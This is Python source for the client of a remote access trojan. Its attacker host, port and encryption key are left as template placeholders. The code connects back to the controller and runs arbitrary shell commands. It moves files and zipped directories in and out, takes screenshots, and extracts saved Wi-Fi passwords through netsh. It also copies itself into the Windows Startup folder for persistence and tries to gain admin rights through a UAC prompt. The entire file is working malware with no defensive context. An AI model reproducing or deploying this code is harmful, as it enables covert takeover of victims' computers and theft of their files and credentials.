from socket import socket, error
import os
from subprocess import Popen, PIPE
from time import sleep
from pyautogui import screenshot
from shutil import make_archive, copy2
from marshal import dumps
import sys
import ctypes
from cryptography.fernet import Fernet


key = "{}"
cipher_suite = Fernet(key)
close = False


def run_as_admin(argv=None, debug=False):
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True
    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    if debug:
        print 'Command line: ', executable, argument_line
    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None


# Function used for encrypting response
# Remember that encryption with incresae data size more than half
def encrypt_response(response):
    return cipher_suite.encrypt(response)


# Function used for adding header to data which tells
# that what is length of comming data
# format == [length of data under 10] + encrpted command
# It means you can send 9999999999 bytes or 9.9 GB of data
# For large data you can change size in my case it is 10
# If you change size then don't forget to change this size in server side script
# And also don't forget to change in "recvall()" function
def sendall(s, data):
    data = encrypt_response(data)
    data = "{{:<10}}".format(len(data)) + data
    s.send(data)


# Function used for receiving all comming data using header
# Please set data_part receiving bytes upto 10 bytes
# so header can completely receive in my case it is "1024" bytes
def recvall(s):
    global close
    new_data = True
    data = ""
    while True:
        data_part = s.recv(1024 * 100000)
        if new_data:
            try:
                data_len = int(data_part[:10])
            except ValueError:
                s.close()
                close = True
                return "a"
            data_part = data_part[10:]
            new_data = False
        data += data_part
        if len(data) == data_len:
            break
    return cipher_suite.decrypt(data)


def client(s):
    global close
    cmd = recvall(s)
    if cmd[:3] == "cd " and not cmd == "cd":
        try:
            print("Changing Directory to " + cmd)
            os.chdir(cmd[3:])
            response = ""
            # Please change OSError to WindowsError if you are using Windows OS
        except WindowsError:
            response = "Directory Not Found"
        response = (response + "\n" + os.getcwd())
        sendall(s, response)
    elif cmd == "list drives":
        response = os.popen('fsutil fsinfo drives').read()
        sendall(s, response)
    elif cmd == "list_dir":
        try:
            list_dir = os.listdir('.')
        except WindowsError:
            os.chdir('..')
            list_dir = os.listdir('.')
        for i in range(len(list_dir)):
            file = list_dir[i]
            if os.path.isdir(file):
                list_dir[i] = (file, 'd')
            elif os.path.isfile(file):
                list_dir[i] = (file, 'f')
        list_dir.append(os.getcwd())
        response = dumps(list_dir)
        sendall(s, response)
    elif cmd.startswith('get '):
        cmd = cmd[4:]
        if os.path.isdir(cmd):
            try:
                os.chdir(cmd)
                response = "Directory changed"
            except WindowsError:
                response = "Something went wrong"
        elif os.path.isfile(cmd):
            try:
                with open(cmd, "rb") as f:
                    response = f.read()
            except IOError:
                response = "not found"
        else:
            response = "not file or dir"
        sendall(s, response)
    elif cmd[:9] == "uploaddir":
        cmd, file_data = cmd.split("||=shail=||")
        dir_name = cmd[9:]
        try:
            open((dir_name + "_uploaded.zip"), 'wb').write(file_data)
            response = "Directory has been uploaded ..."
        except IOError:
            response = "Directory Not Found ..."
        response = (response + "\n" + os.getcwd())
        sendall(s, response)
    elif cmd[:6] == "upload":
        data = cmd[6:].split("||=shail=||")
        try:
            with open(data[0], "wb") as f:
                f.write(data[1])
            response = ("File Has Been Uploaded\n")
        except IOError:
            response = "Directory Not Found ..."
        response = (response + "\n" + os.getcwd())
        sendall(s, response)
    elif cmd[:11] == "downloaddir":
        dir = cmd[11:]
        try:
            archive = make_archive(dir, 'zip', dir)
            response = open(archive, "rb").read()
            os.remove(archive)
        except WindowsError:
            response = "not found"
        response = (response + "||=shail=||" + os.getcwd())
        sendall(s, response)
    elif cmd[:8] == "download":
        file = cmd[8:]
        try:
            with open(file, "rb") as f:
                response = f.read()
        except IOError:
            response = "not found"
        response = (response + "||=shail=||" + os.getcwd())
        sendall(s, response)
    elif cmd == "screenshot":
        myScreenshot = screenshot()
        path = "shot.png"
        myScreenshot.save(path)
        with open(path, "rb") as f:
            response = f.read()
        sendall(s, response)
        os.remove(path)
    elif cmd == 'dump wifi':
        username = os.environ.get('USERNAME')
        data = os.popen("netsh wlan show profiles").read().split('\n')
        profiles = [i.split(': ')[1].replace("\r", '') for i in data if "All User Profile" in i]
        passwords = []
        for i in profiles:
            result = (os.popen("netsh wlan show profile " + i + " key=clear").read().split("\n"))
            password = ([i.split(": ")[1].replace('\r', "") for i in result if "Key Content" in i])
            if password:
                passwords.append(password[0])
            else:
                passwords.append("")
        end = (list(zip(profiles, passwords)))
        wifi = []
        for i in end:
            wifi.append("{{:<20}}|  {{}}".format(i[0], i[1]))
        wifi = '\n'.join(wifi)
        if not wifi:
            wifi = "Not Any Wireless Network Found. Ha ha ha!"
        response = """----------------------------------------
Wifi Password Grabber CREATED BY SHAIL
USERNAME :: {{}}
{{}}
----------------------------------------
DONE
----------------------------------------
""".format(username, wifi)
        sendall(s, response)
    elif cmd == "attach_startup":
        startup = "{{}}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(
            os.path.expanduser("~"))
        copy2(__file__, startup)
        sendall(s, "File attached to startup of directory " + startup)
    elif cmd == "runasadmin":
        ret = run_as_admin()
        if ret is True:
            response = 'ha'
        elif ret is None:
            response = 'You have admin privilege.Now go and use ADMIN client'
        else:
            response = 'Cannot elevate privilege.'
        sendall(s, response)
    elif cmd == "close()":
        s.close()
        close = True
    else:
        response = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        response = (response.stdout.read() + response.stderr.read() + os.getcwd())
        sendall(s, response)


def connection():
    s = socket()
    host = {}
    port = {}
    s.connect((host, port))
    ##################################################################
    # For sending Username about User
    username = str(os.environ.get('USERNAME'))
    sendall(s, username)
    ##################################################################
    print("Connected ...")
    while True:
        client(s)


# This is used to start listening for conections again and again
# if any error occured
# x = 0
while not close:
    try:
        connection()
    except error:
        # x += 1
        # print("Retrying ... ({{}})".format(x))
        sleep(.5)
